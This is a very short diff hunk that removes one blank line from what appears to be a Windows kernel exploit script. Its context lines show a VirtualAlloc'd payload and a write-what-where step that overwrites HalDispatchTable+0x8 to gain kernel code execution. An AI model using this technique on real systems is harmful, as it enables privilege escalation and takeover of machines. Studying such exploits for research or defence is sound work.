@@ -46,7 +46,6 @@ payload = kernel32.VirtualAlloc(
 HalDispatchTable+0x8 = NTBASE + 0xFFFFFF
 
 # Writing payload to HalDispatchTable + 0x8
-
 www.What = payload
 www.Where = HalDispatchTable + 0x8
 
